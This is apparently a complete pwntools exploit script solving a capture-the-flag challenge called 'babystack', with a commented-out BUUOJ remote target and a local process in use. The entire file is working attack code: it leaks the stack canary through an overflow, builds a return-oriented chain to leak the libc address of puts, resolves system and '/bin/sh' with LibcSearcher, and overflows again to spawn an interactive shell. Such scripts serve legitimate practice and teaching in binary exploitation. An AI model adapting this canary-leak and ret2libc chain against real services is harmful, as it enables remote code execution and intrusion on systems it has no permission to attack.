# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
context.log_level='debug'

#r=remote('node3.buuoj.cn',28246)
r=process('./babystack')
pop_rdi=0x0000000000400a93
elf=ELF('./babystack')
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=0x400908


#泄露canary
r.sendlineafter('>>','1')
r.sendline('a'*(0x90-0x8))
r.sendlineafter('>>','2')
r.recvuntil('a\n')
canary=u64(r.recv(7).rjust(8,'\x00'))
print('[+]canary: ',hex(canary))


payload='a'*(0x90-0x8)+p64(canary)+'b'*0x8
payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
r.sendlineafter('>>','1')
r.sendline(payload)
r.sendlineafter('>>','3')
r.recv()

puts_addr=u64(r.recv(6).ljust(8,'\x00'))
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system_addr=libc_base+libc.dump('system')
bin_addr=libc_base+libc.dump('str_bin_sh')

payload='a'*(0x90-0x8)+p64(canary)+'b'*0x8
payload+=p64(pop_rdi)+p64(bin_addr)+p64(system_addr)
r.sendlineafter('>>','1')
r.sendline(payload)
r.sendlineafter('>>','3')
r.interactive()
